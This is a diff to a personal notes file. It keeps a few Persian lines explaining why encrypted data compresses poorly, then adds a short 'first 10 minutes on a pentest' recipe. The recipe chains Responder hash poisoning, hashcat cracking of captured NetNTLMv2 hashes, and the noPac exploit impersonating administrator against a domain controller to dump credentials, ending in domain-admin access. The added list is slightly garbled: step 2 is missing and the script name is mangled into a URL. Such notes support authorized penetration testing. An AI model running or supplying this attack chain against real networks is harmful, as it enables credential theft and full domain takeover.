@@ -32,3 +32,16 @@ WDS or SCCM
 پاسخ: دیتای رمزشده رو نمیشه فشرده کرد.
 یعنی می‌ره تو الگوریتم ولی چیزی از حجمش کم نمیشه.
 فشرده سازی معمولا تابعی از correlation دیتا اولیه هست، اگر اول رمزنگاری کنی کیفیت فشرده سازی ممکنه خراب بشه چون تضمینی نیست دیتای رمزنگاری شده هم همون correlation دیتای اصلی رو داشته باشه
+
+
+
+
+vFirst 10 minutes on a pentest:
+
+1) responder -I eth0 -Pv
+3) hashcat.bin -m 5600 -O -w 3 hash.txt rockyou.txt -r clem9669_small.rule (thanks @Bandrel
+)
+4) http://noPac.py example/user:'pass' -dc-ip 10.0.0.1 -dc-host dc1 --impersonate administrator -dump
+
+Now I'm a DA!
+
